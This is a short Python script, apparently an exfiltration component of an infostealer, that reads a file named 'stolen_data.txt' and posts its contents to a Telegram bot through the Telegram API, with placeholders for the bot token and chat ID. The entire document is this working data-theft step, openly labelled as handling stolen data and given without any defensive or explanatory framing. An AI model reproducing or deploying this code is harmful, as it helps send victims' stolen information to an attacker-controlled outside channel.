import requests

TELEGRAM_BOT_TOKEN = "your_bot_token"
CHAT_ID = "your_chat_id"

stolen_data = open("stolen_data.txt", "r").read()
requests.post(f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage",
              data={"chat_id": CHAT_ID, "text": stolen_data})
